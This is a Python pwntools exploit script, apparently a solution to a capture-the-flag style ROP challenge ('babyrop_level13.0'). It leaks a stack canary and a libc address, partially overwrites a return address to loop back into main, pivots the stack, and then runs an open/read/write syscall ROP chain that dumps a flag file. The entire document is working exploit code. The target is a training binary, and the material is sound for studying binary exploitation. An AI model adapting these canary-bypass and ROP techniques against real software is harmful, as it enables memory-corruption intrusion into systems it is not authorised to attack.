from pwn import *
import time 

binary = './babyrop_level13.0_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')
context.binary = binary
s = '''
b *main+769
#b *main+587
'''

for i in range(5000):
    try:
        print(f"[*] Attempt #{i+1}")
        p = process(binary)
        offset = 0x50
        
        # Get buffer address
        p.recvuntil(b"Your input buffer is located at: ")
        buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
        print(f"[+] Input buffer is at: {hex(buffer_addr)}")
        
        # Get canary
        canary_addr = buffer_addr + offset - 0x8
        p.sendlineafter(b"Address in hex to read from:\n", hex(canary_addr).encode())
        p.recvuntil(b" = ")
        canary = int(p.recvuntil(b"\n", drop=True), 16)
        print(f"[+] Canary value: {hex(canary)}")
        
        # Prepare for ROP
        start_addr_ptr = buffer_addr + 0x108
        
        # First payload to bypass canary and control flow
        #gdb.attach(p, s)
        payload = flat(
		b'A' * 8,
		b'A'* 0x40,
		canary,
		start_addr_ptr - 8,
		b'\xc8\x58\x26'
        )
        
        p.send(payload)
        
        # Check if we've returned to the beginning of the program
        try:
            # Wait for the program to return to the beginning
            response = p.recvuntil(b"Your input buffer is located at: ", timeout=1)
            
            if b"Your input buffer is located at: " in response:
                log.success("Successfully returned to program start!")
                
                # Get new buffer address
                buffer_addr_new = int(p.recvuntil(b".\n\n", drop=True), 16)
                log.success(f"New input buffer is at: {hex(buffer_addr_new)}")
                
                # Now we can leak a libc address
                libc_addr_ptr = buffer_addr_new + 0x58  # Adjust based on where a libc pointer is stored
                p.sendlineafter(b"Address in hex to read from:\n", hex(libc_addr_ptr).encode())
                p.recvuntil(b" = ")
                libc_addr = int(p.recvuntil(b"\n", drop=True), 16)
                log.success(f"Libc address leak: {hex(libc_addr)}")
                libc_offset = 0x24083
                
                libc_base = libc_addr - libc_offset
                
                
                
                
                #gdb.attach(p, s)
                
                # essential addresses 
                
                f_string_addr = libc_base + next(libc.search(b'f\0'))
                
                
                
                #gadgets:
                pop_rdi = libc_base + 0x0000000000023b6a
                print(hex(pop_rdi))
                pop_rax = libc_base + 0x0000000000036174
                pop_rsi = libc_base + 0x000000000002601f
                pop_rdx_pop_r12_ret = libc_base + 0x0000000000119431
                syscall = libc_base + 0x00000000000630a9
                leave_ret = libc_base + 0x0578c8
                
                
                
                
                payload = flat(
                	b'A' * 0x48,
                	canary,
                	start_addr_ptr - (8*7),
                	leave_ret
                )
                p.send(payload)
                p.recvuntil(b"### Welcome to ")
                p.recvuntil(b"ASLR means that")  # Skip to near the buffer address disclosure


		
                response = p.recvuntil(b"Your input buffer is located at: ", timeout=1)
                buffer_addr_new = int(p.recvuntil(b".\n\n", drop=True), 16)
                
                log.success(f"New input buffer is at: {hex(buffer_addr_new)}")
                start_addr_ptr = buffer_addr_new + 0x108
                
                
                p.sendlineafter(b"Address in hex to read from:\n", hex(start_addr_ptr).encode())
                p.recvuntil(b" = ")
                start_addr = int(p.recvuntil(b"\n", drop=True), 16)
                log.success(f"start_addr is at: {hex(start_addr)}")
                start_offset = 0x1200
                elf.address = start_addr - start_offset
                flag_addr = elf.bss() + 100
                
                payload = flat(
                	# read
                	b'A'*0x48,
                	canary,
                	b'B'*8, # old rbp
                	pop_rdi,
                	f_string_addr,
                	pop_rsi,
                	0,
                	pop_rax,
                	2,
                	syscall,
                	
                	# read 
                	pop_rdi,
                	3,
                	pop_rsi,
                	flag_addr,
                	pop_rdx_pop_r12_ret,
                	100,
                	0,
                	pop_rax,
                	0,
                	syscall,
                	
                	# write
                	pop_rdi,
                	1,
                	pop_rsi,
                	flag_addr,
                	pop_rdx_pop_r12_ret,
                	100,
                	0,
                	pop_rax,
                	1,
                	syscall
                	
                	
                )
                p.send(payload)
                
		
		
                p.interactive()
                break
                
        except EOFError:
            log.warning("Program crashed or timed out")
        except Exception as e:
            log.warning(f"Error during second stage: {e}")
        
        p.close()
    except Exception as e:
        log.warning(f"Error during first stage: {e}")
        try:
            p.close()
        except:
            pass

